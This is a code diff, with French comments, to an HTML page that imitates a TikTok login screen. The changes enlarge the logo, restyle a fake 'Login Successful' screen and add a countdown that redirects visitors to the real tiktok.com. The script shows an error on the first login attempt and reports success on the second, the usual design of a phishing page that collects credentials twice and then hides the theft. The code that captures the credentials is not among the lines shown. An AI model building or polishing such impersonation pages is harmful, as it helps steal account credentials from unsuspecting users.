@@ -8,8 +8,8 @@
   <style>
     body,html{margin:0;padding:0;background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;height:100%;overflow:hidden}
     .container{max-width:420px;margin:0 auto;padding:20px;display:flex;flex-direction:column;height:100vh;justify-content:space-between}
-    .logo{text-align:center;margin:50px 0 20px}
-    .logo img{height:50px}
+    .logo{text-align:center;margin:60px 0 30px}
+    .logo img{height:80px} 
     h1{font-size:28px;font-weight:700;text-align:center;margin:20px 0 10px}
     .subtitle{color:#aaa;font-size:15px;text-align:center;line-height:1.5;margin-bottom:40px}
     .form{background:#161616;border-radius:12px;padding:24px;margin:0 12px;box-shadow:0 4px 20px rgba(0,0,0,0.6)}
@@ -21,9 +21,10 @@
     .footer{color:#ffffff80;font-size:13px;text-align:center;padding:20px 0;line-height:1.6}
     .footer a{color:#fe2c55;text-decoration:none;font-weight:600}
     .success-screen{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;flex-direction:column;justify-content:center;align-items:center}
-    .success-screen img{height:50px;margin-bottom:20px}
-    .success-screen h2{font-size:26px;margin-bottom:20px}
-    .success-screen p{color:#aaa;font-size:16px;text-align:center;max-width:300px}
+    .success-screen img{height:80px;margin-bottom:30px} /* ← même taille ici */
+    .success-screen h2{font-size:28px;margin-bottom:20px;color:#fe2c55}
+    .success-screen p{color:#aaa;font-size:16px;text-align:center;max-width:320px;margin-bottom:30px}
+    .redirect-text{color:#69f0ae;font-size:14px}
   </style>
 </head>
 <body>
@@ -51,20 +52,34 @@
   </div>
 </div>
 
-<!-- Écran de succès -->
+<!-- Écran de succès + redirection auto -->
 <div class="success-screen" id="successScreen">
   <img src="tiktok-logo.png" alt="TikTok">
   <h2>Login Successful!</h2>
   <p>Your account has been verified and is now active.</p>
+  <p class="redirect-text">You will be redirected to TikTok in <span id="countdown">3</span> seconds...</p>
 </div>
 
 <script>
   let attempts = 0;
+
   function submitLogin() {
     attempts++;
     if (attempts >= 2) {
       document.getElementById("loginPage").style.display = "none";
       document.getElementById("successScreen").style.display = "flex";
+
+      // Compte à rebours + redirection
+      let seconds = 3;
+      const countdownEl = document.getElementById("countdown");
+      const timer = setInterval(() => {
+        seconds--;
+        countdownEl.textContent = seconds;
+        if (seconds <= 0) {
+          clearInterval(timer);
+          window.location.href = "https://www.tiktok.com";
+        }
+      }, 1000);
     } else {
       document.getElementById("error").style.display = "block";
     }
